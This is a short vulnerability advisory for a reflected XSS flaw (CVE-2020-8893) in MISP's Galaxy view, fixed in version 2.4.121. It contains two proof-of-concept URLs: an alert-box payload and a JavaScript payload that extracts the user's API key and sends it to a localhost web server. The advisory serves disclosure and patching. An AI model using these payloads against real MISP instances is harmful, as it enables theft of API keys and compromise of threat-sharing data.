# MISP - Malware Information Sharing Platform
## Reflected XSS in Galaxy view

|  |  |
|---|---|
| **Vulnerability** | Reflected XSS in Galaxy view | 
| **Vendor** | CIRCL (Open Source) |
| **Product** | MISP - Malware Information Sharing Platform & Open Standards For Threat Information Sharing - https://www.misp-project.org/ |
| **Vulnerable version** | 2.4.120 |
| **Fixed version** | 2.4.121 |
| **CVE** | CVE-2020-8893 |
| **CVSS Score** | 6.1 Medium |
| **CVSS Vector** | CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N |

## References
* https://www.misp-project.org/2020/02/12/MISP.2.4.121.released.html
* https://github.com/MISP/MISP/commit/3d982d92fd26584115c01f8c560a688d1096b65c
* https://nvd.nist.gov/vuln/detail/CVE-2020-8893

## Description

### PoC
Proof of concept alert box:
```
    https://MISP_URL/galaxies/view/188/searchall:a%22)%3balert(1);;$.get(%22http%3a/0.0.0.0/www
```

### PoC
Proof of concept of API key extraction to localhost web server:
```
    https://MISP_URL/galaxies/view/188/searchall:a")%3b$.get('%5c%5cusers%5c%5cview%5c%5cme',function(d){pos_start+%3d+d.indexOf('<h2>User<')%2b4%3bpos_end%3dd.indexOf(decodeURI('%253Cdiv%2520class%3d%2522actions%2520debugOff%2520sideMenu%2522%253E'),pos_start)%3bif(pos_start>pos_end)pos_end%3dpos_start*99%3binterested%3dd.substring(pos_start,pos_end)%3b$.get('http:%5c%5c%5c%5c127.0.0.1%5c%5c'%2bescape(interested));});$.get("http%3a%5c%5c0.0.0.0%5c%5cwww
```

